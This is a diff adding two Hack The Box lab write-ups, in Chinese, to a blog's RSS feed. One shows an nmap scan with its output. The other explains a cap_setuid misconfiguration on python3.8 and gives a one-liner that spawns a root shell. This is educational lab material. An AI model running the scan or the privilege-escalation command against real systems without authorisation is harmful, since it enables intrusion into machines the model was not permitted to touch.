@@ -12,12 +12,113 @@
     
     <copyright>本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！</copyright>
     
-    <lastBuildDate>Sat, 04 Apr 2026 00:00:00 +0000</lastBuildDate>
+    <lastBuildDate>Fri, 19 Jun 2026 00:00:00 +0000</lastBuildDate>
     
     
     <atom:link href="https://test692618.github.io/tags/htb/index.xml" rel="self" type="application/rss&#43;xml" />
     
 
+    
+    
+
+    <item>
+      <title>htb-Connected</title>
+      <link>https://test692618.github.io/post/htb/htb%E6%89%93%E9%9D%B6-connected/</link>
+      <pubDate>Fri, 19 Jun 2026 00:00:00 &#43;0000</pubDate>
+      <author>knock_s@foxmial.com (L)</author>
+      <guid>https://test692618.github.io/post/htb/htb%E6%89%93%E9%9D%B6-connected/</guid>
+      <description>
+        <![CDATA[<h1>htb-Connected</h1><p>作者：L（knock_s@foxmial.com）</p>
+        
+          <h2 id="端口枚举">
+<a class="header-anchor" href="#%e7%ab%af%e5%8f%a3%e6%9e%9a%e4%b8%be"></a>
+端口枚举
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nv">ports</span><span class="o">=</span><span class="k">$(</span>nmap --top-ports<span class="o">=</span><span class="m">1000</span>  --min-rate<span class="o">=</span><span class="m">1000</span> -Pn -T4 <span class="nv">$ip</span>  <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f <span class="m">1</span> <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed s/,$//<span class="k">)</span>
+</span></span><span class="line"><span class="cl">nmap -p <span class="nv">$ports</span> -Pn -sC -sV <span class="nv">$ip</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-----
+</span></span><span class="line"><span class="cl">PORT    STATE SERVICE   VERSION
+</span></span><span class="line"><span class="cl">22/tcp  open  ssh       OpenSSH 7.4 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> 4e:60:38:6f:e7:78:6c:ca:58:62:a1:f1:56:ae:8d:30 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 12:41:55:26:9d:ad:3d:e8:bf:4e:31:aa:d7:d1:a5:d2 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 8e:b6:96:e0:21:83:5d:1d:ce:8d:e2:6a:dd:38:c6:75 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp  open  http      Apache httpd 2.4.6 <span class="o">((</span>CentOS<span class="o">)</span> OpenSSL/1.0.2k-fips PHP/7.4.16<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to http://connected.htb/
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.6 <span class="o">(</span>CentOS<span class="o">)</span> OpenSSL/1.0.2k-fips PHP/7.4.16
+</span></span><span class="line"><span class="cl">443/tcp open  ssl/https Apache/2.4.6 <span class="o">(</span>CentOS<span class="o">)</span> OpenSSL/1.0.2k-fips PHP/7.4.16
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.6 <span class="o">(</span>CentOS<span class="o">)</span> OpenSSL/1.0.2k-fips PHP/7.4.16
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>pbxconnect/organizationName<span class="o">=</span>SomeOrganization/stateOrProvinceName<span class="o">=</span>SomeState/countryName<span class="o">=</span>--
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2025-11-30T14:07:27
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2026-11-30T14:07:27
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: <span class="m">400</span> Bad Request
+</span></span></code></pre></div><h2 id="web信息枚举">
+<a class="header-anchor" href="#web%e4%bf%a1%e6%81%af%e6%9e%9a%e4%b8%be"></a>
+WEB信息枚举
+</h2><p><img src="#ZgotmplZ" alt="image-20260619213121664"></p>
+        
+        <hr><p>本文2026-06-19首发于<a href='https://test692618.github.io/'>HELLO WORLD</a>，最后修改于2026-06-19</p>]]>
+      </description>
+      
+        <category>HTB</category>
+      
+    </item>
+    
+    
+
+    <item>
+      <title>htb-cap</title>
+      <link>https://test692618.github.io/post/htb/htb%E6%89%93%E9%9D%B6-cap/</link>
+      <pubDate>Thu, 18 Jun 2026 00:00:00 &#43;0000</pubDate>
+      <author>knock_s@foxmial.com (L)</author>
+      <guid>https://test692618.github.io/post/htb/htb%E6%89%93%E9%9D%B6-cap/</guid>
+      <description>
+        <![CDATA[<h1>htb-cap</h1><p>作者：L（knock_s@foxmial.com）</p>
+        
+          <h2 id="枚举">
+<a class="header-anchor" href="#%e6%9e%9a%e4%b8%be"></a>
+枚举
+</h2><p>此处省略。。。。</p>
+<p>我直接快进</p>
+<h2 id="权限提升利用python错误配置提权">
+<a class="header-anchor" href="#%e6%9d%83%e9%99%90%e6%8f%90%e5%8d%87%e5%88%a9%e7%94%a8python%e9%94%99%e8%af%af%e9%85%8d%e7%bd%ae%e6%8f%90%e6%9d%83"></a>
+权限提升（利用python错误配置提权）
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#通过linpeas发现此配置 </span>
+</span></span><span class="line"><span class="cl">......
+</span></span><span class="line"><span class="cl">/usr/bin/python3.8 <span class="o">=</span> cap_setuid,cap_net_bind_service+eip
+</span></span><span class="line"><span class="cl">......
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#注意</span>
+</span></span><span class="line"><span class="cl">	通过“getcap /usr/bin/python3.8” 命令，可以查到此配置。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	python默认不存在此配置，通过“ setcap cap_setuid+ep /usr/bin/python3.8 ”可手动加上（需root操作） 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#解释</span>
+</span></span><span class="line"><span class="cl">	这表明 /usr/bin/python3.8这个可执行文件被赋予了两个特殊的 Linux Capabilities（能力/权能）：
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        cap_setuid：
+</span></span><span class="line"><span class="cl">        正常情况：Linux 中，只有 root 用户才能把自己的用户 ID（UID）改成 0（root）。
+</span></span><span class="line"><span class="cl">        这里的情况：cap_setuid打破了这个规则，它允许 Python 解释器在运行脚本时，直接将自身的权限提升为 root。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        cap_net_bind_service：
+</span></span><span class="line"><span class="cl">        正常情况：只有 root 用户才能监听 <span class="m">1024</span> 以下的“特权端口”（如 80、443、22 等）。
+</span></span><span class="line"><span class="cl">        这里的情况：给了 Python 绑定这些低端口的权限，通常用于容器或特殊服务，但在主机上配合其他权限会非常危险。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        +eip：
+</span></span><span class="line"><span class="cl">        代表这两个能力当前处于生效（Effective）、允许（Permitted）和继承（Inherited）状态。这意味着 Python 进程随时可以调用这些特权。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 利用脚本</span>
+</span></span><span class="line"><span class="cl">    /usr/bin/python3.8 -c <span class="s1">&#39;import os; os.setuid(0); os.system(&#34;/bin/bash&#34;)&#39;</span>
+</span></span></code></pre></div>
+        
+        <hr><p>本文2026-06-18首发于<a href='https://test692618.github.io/'>HELLO WORLD</a>，最后修改于2026-06-18</p>]]>
+      </description>
+      
+        <category>HTB</category>
+      
+    </item>
     
     
 
